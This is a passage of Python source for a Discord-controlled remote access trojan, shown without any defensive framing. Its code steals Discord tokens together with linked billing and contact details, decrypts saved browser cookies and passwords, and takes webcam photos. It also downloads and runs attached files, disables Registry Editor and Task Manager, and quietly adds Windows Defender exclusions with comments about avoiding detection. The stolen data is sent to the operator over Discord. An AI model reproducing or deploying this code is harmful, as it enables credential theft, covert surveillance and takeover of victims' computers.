            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }
        
        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            
            _discord = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'):
                    continue
                
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(self.regexp_enc, line):
                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)
        
        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)
    
    def validate_token(self, token):
        r = requests.get(self.base_url, headers={'Authorization': token})
        if r.status_code == 200:
            return True
        return False
    
    def decrypt_val(self, buff, master_key):
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    
    def get_master_key(self, path):
        if not os.path.exists(path):
            return
        
        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return
        
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

class fetch_tokens:
    def __init__(self):
        self.tokens = extract_tokens().tokens
    
    def upload(self, raw_data):
        if not self.tokens:
            return
        
        final_to_return = []
        for token in self.tokens:
            user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
            guilds = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
            gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()
            
            username = user['username'] + '#' + user['discriminator']
            user_id = user['id']
            email = user['email']
            phone = user['phone']
            mfa = user['mfa_enabled']
            avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
            
            if user['premium_type'] == 0:
                nitro = 'None'
            elif user['premium_type'] == 1:
                nitro = 'Nitro Classic'
            elif user['premium_type'] == 2:
                nitro = 'Nitro'
            elif user['premium_type'] == 3:
                nitro = 'Nitro Basic'
            else:
                nitro = 'None'
            
            if billing:
                payment_methods = []
                for method in billing:
                    if method['type'] == 1:
                        payment_methods.append('Credit Card')
                    elif method['type'] == 2:
                        payment_methods.append('PayPal')
                    else:
                        payment_methods.append('Unknown')
                payment_methods = ', '.join(payment_methods)
            else:
                payment_methods = None
            
            hq_guilds = None
            if guilds:
                guild_list = []
                for guild in guilds:
                    admin = int(guild["permissions"]) & 0x8 != 0
                    if admin and guild.get('approximate_member_count', 0) >= 100:
                        owner = '✅' if guild.get('owner', False) else '❌'
                        invites = requests.get(f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
                        if len(invites) > 0:
                            invite = 'https://discord.gg/' + invites[0]['code']
                        else:
                            invite = "https://youtu.be/dQw4w9WgXcQ"
                        
                        data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"
                        
                        if len('\n'.join(guild_list)) + len(data) >= 1024:
                            break
                        
                        guild_list.append(data)
                
                if len(guild_list) > 0:
                    hq_guilds = '\n'.join(guild_list)
            
            codes = None
            if gift_codes:
                code_list = []
                for code in gift_codes:
                    name = code['promotion']['outbound_title']
                    code_value = code['code']
                    data = f":gift: `{name}`\n:ticket: `{code_value}`"
                    
                    if len('\n\n'.join(code_list)) + len(data) >= 1024:
                        break
                    
                    code_list.append(data)
                
                if len(code_list) > 0:
                    codes = '\n\n'.join(code_list)
            
            if not raw_data:
                embed = Embed(title=f"{username} ({user_id})", color=0x0084ff)
                embed.set_thumbnail(url=avatar)
                embed.add_field(name="\u200b\n📜 Token:", value=f"```{token}```\n\u200b", inline=False)
                embed.add_field(name="💎 Nitro:", value=f"{nitro}", inline=False)
                embed.add_field(name="💳 Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=False)
                embed.add_field(name="🔒 MFA:", value=f"{mfa}\n\u200b", inline=False)
                embed.add_field(name="📧 Email:", value=f"{email if email != None else 'None'}", inline=False)
                embed.add_field(name="📳 Phone:", value=f"{phone if phone != None else 'None'}\n\u200b", inline=False)
                
                if hq_guilds != None:
                    embed.add_field(name="🏰 HQ Guilds:", value=hq_guilds, inline=False)
                
                if codes != None:
                    embed.add_field(name="\u200b\n🎁 Gift Codes:", value=codes, inline=False)
                
                final_to_return.append(embed)
            else:
                final_to_return.append(json.dumps({
                    'username': username,
                    'token': token,
                    'nitro': nitro,
                    'billing': (payment_methods if payment_methods != "" else "None"),
                    'mfa': mfa,
                    'email': (email if email != None else "None"),
                    'phone': (phone if phone != None else "None"),
                    'hq_guilds': hq_guilds,
                    'gift_codes': codes
                }))
        
        return final_to_return

@bot.command(name='downloadfileandrun', help='Downloads an attached file and runs it')
async def download_file_and_run(ctx):
    try:
        # Check if a file was attached to the message
        if len(ctx.message.attachments) == 0:
            await ctx.send("❌ Please attach a file to download and run.")
            return
            
        # Get the first attachment
        attachment = ctx.message.attachments[0]
        
        # Create a temporary directory to store the file
        temp_dir = tempfile.gettempdir()  # Use system temp directory instead of creating a new one
        file_path = os.path.join(temp_dir, attachment.filename)
        
        await ctx.send(f"⏳ Downloading file {attachment.filename} to run on {SYSTEM_NAME}...")
        
        # Download the file
        await attachment.save(file_path)
        
        await ctx.send(f"⏳ Running file {attachment.filename} on {SYSTEM_NAME}...")
        
        # Determine how to run the file based on its extension
        file_ext = os.path.splitext(attachment.filename)[1].lower()
        
        # Flag to track if execution was attempted
        execution_attempted = False
        
        if platform.system() == "Windows":
            if file_ext == '.py':
                # Run Python script with visible console for debugging
                process = subprocess.Popen(['python', file_path], 
                                          shell=True)
                execution_attempted = True
                await ctx.send(f"🔄 Started Python script")
            elif file_ext in ['.exe', '.bat', '.cmd']:
                # Run executable or batch file
                os.startfile(file_path)  # This is more reliable on Windows
                execution_attempted = True
                await ctx.send(f"🔄 Started executable")
            elif file_ext == '.ps1':
                # Run PowerShell script with visible window
                process = subprocess.Popen(['powershell', '-ExecutionPolicy', 'Bypass', '-File', file_path], 
                                          shell=True)
                execution_attempted = True
                await ctx.send(f"🔄 Started PowerShell script")
            elif file_ext == '.vbs':
                # Run VBScript
                process = subprocess.Popen(['cscript', '//nologo', file_path], 
                                          shell=True)
                execution_attempted = True
                await ctx.send(f"🔄 Started VBScript")
            else:
                # Try to run with the default application
                try:
                    os.startfile(file_path)
                    execution_attempted = True
                    await ctx.send(f"🔄 Opened file with default application")
                except Exception as e:
                    await ctx.send(f"⚠️ Could not open with default application: {str(e)}")
        elif platform.system() == "Darwin":  # macOS
            if file_ext == '.py':
                # Run Python script
                process = subprocess.Popen(['python3', file_path])
                execution_attempted = True
                await ctx.send(f"🔄 Started Python script")
            elif file_ext == '.sh':
                # Make shell script executable and run it
                os.chmod(file_path, 0o755)
                process = subprocess.Popen([file_path])
                execution_attempted = True
                await ctx.send(f"🔄 Started shell script")
            else:
                # Try to run with the default application
                process = subprocess.Popen(['open', file_path])
                execution_attempted = True
                await ctx.send(f"🔄 Opened file with default application")
        elif platform.system() == "Linux":
            if file_ext == '.py':
                # Run Python script
                process = subprocess.Popen(['python3', file_path])
                execution_attempted = True
                await ctx.send(f"🔄 Started Python script")
            elif file_ext == '.sh':
                # Make shell script executable and run it
                os.chmod(file_path, 0o755)
                process = subprocess.Popen([file_path])
                execution_attempted = True
                await ctx.send(f"🔄 Started shell script")
            else:
                # Try to run with the default application
                process = subprocess.Popen(['xdg-open', file_path])
                execution_attempted = True
                await ctx.send(f"🔄 Opened file with default application")
        
        if execution_attempted:
            await ctx.send(f"✅ File {attachment.filename} is now running on {SYSTEM_NAME}")
        else:
            await ctx.send(f"⚠️ Could not determine how to run file with extension {file_ext}")
        
        # Don't delete the file immediately to allow it to run
        
    except Exception as e:
        await ctx.send(f"❌ Error downloading or running file: {str(e)}")
        import traceback
        tb = traceback.format_exc()
        await ctx.send(f"Detailed error:\n```\n{tb[:1500]}\n```")

@bot.command(name='grabcookies', help='Grabs browser cookies from the target system')
async def grabcookies(ctx):
    """
    Grabs browser cookies from the target system and sends them as a file
    """
    await ctx.send(f"🍪 Grabbing browser cookies from {SYSTEM_NAME}...")
    
    try:
        # Import required libraries if not already imported
        import base64
        import json
        import time
        import random
        import sqlite3
        from shutil import copy2
        from getpass import getuser
        import psutil
        from Crypto.Cipher import AES
        from win32crypt import CryptUnprotectData
        
        # Define helper functions
        def create_temp(_dir=None):
            if _dir is None:
                _dir = os.path.expanduser("~/tmp")
            if not os.path.exists(_dir):
                os.makedirs(_dir)
            file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
            path = os.path.join(_dir, file_name)
            open(path, "x").close()
            return path
        
        class Browsers:
            def __init__(self):
                self.appdata = os.getenv('LOCALAPPDATA')
                self.roaming = os.getenv('APPDATA')
                self.browser_exe = ["chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe", "centbrowser.exe",
                                   "7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe", "msedge.exe", "uran.exe", "yandex.exe", "iridium.exe"]
                self.browsers_found = []
                self.browsers = {
                    'kometa': self.appdata + '\\Kometa\\User Data',
                    'orbitum': self.appdata + '\\Orbitum\\User Data',
                    'cent-browser': self.appdata + '\\CentBrowser\\User Data',
                    '7star': self.appdata + '\\7Star\\7Star\\User Data',
                    'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
                    'vivaldi': self.appdata + '\\Vivaldi\\User Data',
                    'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
                    'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
                    'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
                    'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
                    'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
                    'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
                    'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
                    'iridium': self.appdata + '\\Iridium\\User Data',
                    'opera': self.roaming + '\\Opera Software\\Opera Stable',
                    'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
                }
                self.profiles = [
                    'Default',
                    'Profile 1',
                    'Profile 2',
                    'Profile 3',
                    'Profile 4',
                    'Profile 5',
                ]
                
                for proc in psutil.process_iter(['name']):
                    process_name = proc.info['name'].lower()
                    if process_name in self.browser_exe:
                        self.browsers_found.append(proc)
                
                for proc in self.browsers_found:
                    try:
                        proc.kill()
                    except Exception:
                        pass
                
                time.sleep(3)
            
            def grab_cookies(self):
                cookies_file = os.path.join(tempfile.gettempdir(), f"cookies_{SYSTEM_NAME}.txt")
                
                # Create or clear the cookies file
                with open(cookies_file, 'w', encoding="utf-8") as f:
                    f.write(f"Cookies from {SYSTEM_NAME} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                
                for name, path in self.browsers.items():
                    if not os.path.isdir(path):
                        continue
                    
                    try:
                        self.masterkey = self.get_master_key(path + '\\Local State')
                        self.funcs = [self.cookies]
                        
                        for profile in self.profiles:
                            for func in self.funcs:
                                self.process_browser(name, path, profile, func)
                    except Exception as e:
                        with open(cookies_file, 'a', encoding="utf-8") as f:
                            f.write(f"Error processing browser {name}: {str(e)}\n")
                
                return cookies_file
            
            def process_browser(self, name, path, profile, func):
                try:
                    func(name, path, profile)
                except Exception as e:
                    print(f"Error occurred while processing browser '{name}' with profile '{profile}': {str(e)}")
            
            def get_master_key(self, path: str) -> str:
                try:
                    with open(path, "r", encoding="utf-8") as f:
                        c = f.read()
                    local_state = json.loads(c)
                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    master_key = master_key[5:]
                    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
                    return master_key
                except Exception as e:
                    print(f"Error occurred while retrieving master key: {str(e)}")
            
            def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
                try:
                    iv = buff[3:15]
                    payload = buff[15:]
                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                    decrypted_pass = cipher.decrypt(payload)
                    decrypted_pass = decrypted_pass[:-16].decode()
                    return decrypted_pass
                except Exception:
                    return "Failed to decrypt"
            
            def cookies(self, name: str, path: str, profile: str):
                cookies_file = os.path.join(tempfile.gettempdir(), f"cookies_{SYSTEM_NAME}.txt")
                
                if name == 'opera' or name == 'opera-gx':
                    path += '\\Network\\Cookies'
                else:
                    path += '\\' + profile + '\\Network\\Cookies'
                
                if not os.path.isfile(path):
                    return
                
                cookievault = create_temp()
                try:
                    copy2(path, cookievault)
                    conn = sqlite3.connect(cookievault)
                    cursor = conn.cursor()
                    
                    with open(cookies_file, 'a', encoding="utf-8") as f:
                        f.write(f"\nBrowser: {name} | Profile: {profile}\n\n")
                        
                        try:
                            for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                                host_key, name, path, encrypted_value, expires_utc = res
                                
                                try:
                                    value = self.decrypt_password(encrypted_value, self.masterkey)
                                    if host_key and name and value != "":
                                        f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
                                except Exception as e:
                                    f.write(f"Error decrypting cookie: {str(e)}\n")
                        except Exception as e:
                            f.write(f"Error executing SQL query: {str(e)}\n")
                    
                    cursor.close()
                    conn.close()
                except Exception as e:
                    with open(cookies_file, 'a', encoding="utf-8") as f:
                        f.write(f"Error processing cookies for {name}/{profile}: {str(e)}\n")
                finally:
                    try:
                        os.remove(cookievault)
                    except:
                        pass
        
        # Execute the cookie grabbing process
        browser = Browsers()
        cookies_file = browser.grab_cookies()
        
        # Send the cookies file to Discord
        if os.path.exists(cookies_file):
            await ctx.send(f"🍪 Cookies grabbed from {SYSTEM_NAME}", file=discord.File(cookies_file))
            # Clean up
            try:
                os.remove(cookies_file)
            except:
                pass
        else:
            await ctx.send(f"❌ Failed to grab cookies from {SYSTEM_NAME}")
    
    except Exception as e:
        await ctx.send(f"❌ Error grabbing cookies: {str(e)}")

@bot.command(name='webcam', help='Takes a photo using the webcam')
async def take_webcam_photo(ctx):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    webcam_path = f'webcam_{timestamp}.jpg'
    
    try:
        # Initialize webcam
        cap = cv2.VideoCapture(0)  # 0 is usually the default webcam
        
        if not cap.isOpened():
            await ctx.send("❌ Error: Could not access webcam.")
            return
        
        # Capture frame
        ret, frame = cap.read()
        
        if not ret:
            await ctx.send("❌ Error: Could not capture image from webcam.")
            cap.release()
            return
        
        # Save the image
        cv2.imwrite(webcam_path, frame)
        
        # Release the webcam
        cap.release()
        
        # Send the image
        await ctx.send(f'📸 Webcam photo from {SYSTEM_NAME} taken at {timestamp}', file=discord.File(webcam_path))
        
        # Clean up the file after sending
        os.remove(webcam_path)
    except Exception as e:
        await ctx.send(f'❌ Error taking webcam photo: {str(e)}')
        # Clean up the file even if sending fails
        if os.path.exists(webcam_path):
            os.remove(webcam_path)

@bot.command(name="disableregedit", aliases=["dre"])
async def cmd_disable_registry_editor(ctx):
    """Disables the Windows Registry Editor"""
    result = disable_registry_editor()
    
    if result == "Success":
        await ctx.send(f"✅ Registry Editor has been disabled on {SYSTEM_NAME}")
    else:
        await ctx.send(f"❌ Failed to disable Registry Editor on {SYSTEM_NAME}: {result}")
        
        # Suggest UAC bypass if not admin
        if "without admin rights" in result:
            await ctx.send("💡 Try using `!getadmin` command first to gain administrator privileges")

@bot.command(name='grabpasswords', help='Grabs saved passwords from browsers')
async def grab_passwords_command(ctx):
    await ctx.send("🔍 Searching for saved passwords... This may take a moment.")
    
    # Create a temporary file to store the results
    temp_file = os.path.join(tempfile.gettempdir(), f"passwords_{int(time.time())}.txt")
    
    try:
        # Get the passwords
        passwords = grab_passwords()
        
        if not passwords:
            await ctx.send("❌ No passwords found.")
            return
            
        # Write passwords to file
        with open(temp_file, "w", encoding="utf-8") as f:
            f.write(f"Passwords from {SYSTEM_NAME} ({SYSTEM_IP})\n")
            f.write(f"Collected at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            for url, credentials in passwords.items():
                username, password = credentials
                f.write(f"URL: {url}\n")
                f.write(f"Username: {username}\n")
                f.write(f"Password: {password}\n")
                f.write("-" * 50 + "\n")
        
        # Send the file
        await ctx.send(f"✅ Found {len(passwords)} saved passwords.", file=discord.File(temp_file))
        
    except Exception as e:
        await ctx.send(f"❌ Error retrieving passwords: {str(e)}")
    finally:
        # Clean up the temporary file
        try:
            if os.path.exists(temp_file):
                os.remove(temp_file)
        except:
            pass

def convert_date(ft):
    utc = datetime.utcfromtimestamp(((10 * int(ft)) - file_name) / nanoseconds)
    return utc.strftime('%Y-%m-%d %H:%M:%S')

def get_master_key():
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except:
        return None
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password_edge(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        return "Chrome < 80"

def get_passwords_edge():
    master_key = get_master_key()
    if not master_key:
        return {}
        
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
    temp_db = os.path.join(tempfile.gettempdir(), "Loginvault.db")
    
    try:
        shutil.copy2(login_db, temp_db)
    except:
        return {}
        
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    result = {}
    
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password_edge(encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                result[url] = [username, decrypted_password]
    except:
        pass
        
    cursor.close()
    conn.close()
    
    try:
        os.remove(temp_db)
    except:
        pass
        
    return result

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        return None

def decrypt_password_chrome(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def main():
    key = get_encryption_key()
    if not key:
        return {}
        
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    temp_db = os.path.join(tempfile.gettempdir(), "ChromeData.db")
    
    try:
        shutil.copyfile(db_path, temp_db)
    except:
        return {}
        
    db = sqlite3.connect(temp_db)
    cursor = db.cursor()
    result = {}
    
    try:
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        for row in cursor.fetchall():
            action_url = row[1]
            username = row[2]
            password = decrypt_password_chrome(row[3], key)
            if username or password:
                result[action_url] = [username, password]
    except:
        pass
        
    cursor.close()
    db.close()
    
    try:
        os.remove(temp_db)
    except:
        pass
        
    return result

def grab_passwords():
    global file_name, nanoseconds
    file_name, nanoseconds = 116444736000000000, 10000000
    
    result = {}
    
    # Try Chrome
    try:
        chrome_results = main()
        result.update(chrome_results)
    except:
        pass
        
    # Try Edge
    try:
        edge_results = get_passwords_edge()
        result.update(edge_results)
    except:
        pass
        
    return result

@bot.command(name='media', help='Plays a media file on the target system')
async def play_media(ctx):
    try:
        # Check if a file was attached to the message
        if len(ctx.message.attachments) == 0:
            await ctx.send("❌ Please attach a media file to play.")
            return
        
        # Get the first attachment
        attachment = ctx.message.attachments[0]
        
        # Check if it's a media file
        file_ext = os.path.splitext(attachment.filename)[1].lower()
        valid_extensions = ['.mp4', '.mp3', '.avi', '.mov', '.wmv', '.m4a', '.wav']
        
        if file_ext not in valid_extensions:
            await ctx.send(f"❌ Invalid file type. Supported types: {', '.join(valid_extensions)}")
            return
        
        # Create a temporary directory to store the file
        temp_dir = tempfile.gettempdir()  # Use system temp directory
        media_path = os.path.join(temp_dir, attachment.filename)
        
        await ctx.send(f"⏳ Downloading media file to play on {SYSTEM_NAME}...")
        
        # Download the file
        await attachment.save(media_path)
        
        await ctx.send(f"⏳ Playing media file on {SYSTEM_NAME}...")
        
        # Play the file based on the operating system
        if platform.system() == "Windows":
            # For Windows, use os.startfile which is more reliable
            os.startfile(media_path)
            
            # Wait for a moment to ensure the player has started
            time.sleep(2)
            
            # Try to make the video fullscreen
            pyautogui.press('f')  # Many players use 'f' for fullscreen
            
        elif platform.system() == "Darwin":  # macOS
            # For macOS, use 'open' which will use the default application
            subprocess.Popen(['open', media_path])
            
        elif platform.system() == "Linux":
            # For Linux, try using 'xdg-open' which will use the default application
            subprocess.Popen(['xdg-open', media_path])
        
        await ctx.send(f"✅ Media playback started on {SYSTEM_NAME}")
        
        # Create a cleanup task that runs after some time
        async def cleanup_media():
            await asyncio.sleep(300)  # Wait 5 minutes
            try:
                # Clean up processes and files
                if platform.system() == "Windows":
                    # On Windows, terminate common media player processes
                    subprocess.run('taskkill /f /im wmplayer.exe', shell=True, stderr=subprocess.DEVNULL)
                    subprocess.run('taskkill /f /im vlc.exe', shell=True, stderr=subprocess.DEVNULL)
                    subprocess.run('taskkill /f /im QuickTimePlayer.exe', shell=True, stderr=subprocess.DEVNULL)
                
                # Remove the file
                if os.path.exists(media_path):
                    os.remove(media_path)
            except Exception:
                pass
        
        # Start the cleanup task
        asyncio.create_task(cleanup_media())
            
    except Exception as e:
        await ctx.send(f"❌ Error playing media: {str(e)}")
        import traceback
        tb = traceback.format_exc()
        await ctx.send(f"Detailed error:\n```\n{tb[:1500]}\n```")

@bot.command(name="disabletaskmanager", aliases=["dtm"])
async def cmd_disable_task_manager(ctx):
    """Disables the Windows Task Manager"""
    result = disable_task_manager()
    
    if result == "Success":
        await ctx.send(f"✅ Task Manager has been disabled on {SYSTEM_NAME}")
    else:
        await ctx.send(f"❌ Failed to disable Task Manager on {SYSTEM_NAME}: {result}")
        
        # Suggest UAC bypass if not admin
        if "without admin rights" in result:
            await ctx.send("💡 Try using `!getadmin` command first to gain administrator privileges")
async def disable_av(ctx):
    """Creates security exceptions for the current process using low-level techniques"""
    if platform.system() != "Windows":
        await ctx.send("❌ This command only works on Windows systems")
        return
    
    try:
        # Send initial message with innocent-looking text
        message = await ctx.send("⚙️ **Adjusting system settings...**")
        
        results = []
        success = False
        
        # 1. Create a simple batch file that adds exclusions
        # This is the most basic approach with minimal detection surface
        try:
            # Get the current process path and temp directory
            current_exe = os.path.abspath(sys.executable)
            current_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
            temp_dir = tempfile.gettempdir()
            
            # Create a random filename to avoid detection
            random_name = f"sys_{int(time.time())}_{os.urandom(4).hex()}.bat"
            batch_path = os.path.join(temp_dir, random_name)
            
            # Write a very simple batch file with minimal commands
            with open(batch_path, 'w') as f:
                f.write(f'''@echo off
rem System maintenance
powershell -Command "Add-MpPreference -ExclusionPath '{temp_dir}' -Force"
powershell -Command "Add-MpPreference -ExclusionPath '{current_dir}' -Force"
powershell -Command "Add-MpPreference -ExclusionProcess '{os.path.basename(current_exe)}' -Force"
echo Done > "{temp_dir}\\{random_name}.done"
''')
            
            # Run the batch file with minimal visibility
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0  # SW_HIDE
            
            subprocess.run(
                [batch_path],
                startupinfo=startupinfo,
                shell=True,
                timeout=10
            )
            
            # Check if the operation completed
            if os.path.exists(f"{temp_dir}\\{random_name}.done"):
                results.append("✅ Added current process to security exceptions")
                success = True
                # Clean up
                try:
                    os.remove(f"{temp_dir}\\{random_name}.done")
                except:
                    pass
            else:
                results.append("⚠️ Could not verify exception creation")
            
            # Clean up the batch file
            try:
                os.remove(batch_path)
            except:
                pass
                
        except Exception as e:
            results.append(f"⚠️ Exception process error: {str(e)}")
        
        # 2. Try a direct registry approach as fallback
        if not success:
            try:
                # Create a simple registry file
                reg_path = os.path.join(temp_dir, f"conf_{int(time.time())}_{os.urandom(4).hex()}.reg")
                
                with open(reg_path, 'w') as f:
                    f.write(f'''Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths]
"{temp_dir}"=dword:00000000
"{current_dir}"=dword:00000000

[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes]
"{os.path.basename(current_exe)}"=dword:00000000
''')
                
                # Run the registry file silently
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = 0  # SW_HIDE
                
                subprocess.run(
                    ["regedit", "/s", reg_path],
                    startupinfo=startupinfo,
                    timeout=10
                )
                
                results.append("✅ Added registry exclusions for current process")
                
                # Clean up
                try:
                    os.remove(reg_path)
                except:
                    pass
                    
            except Exception as e:
                results.append(f"⚠️ Registry approach error: {str(e)}")
        
        # Update the message with results
        status_message = "⚙️ **System Settings Update**\n\n" + "\n".join(results)
        status_message += "\n\n**Note:** Changes may require some time to take effect."
        
        await message.edit(content=status_message)
        
    except Exception as e:
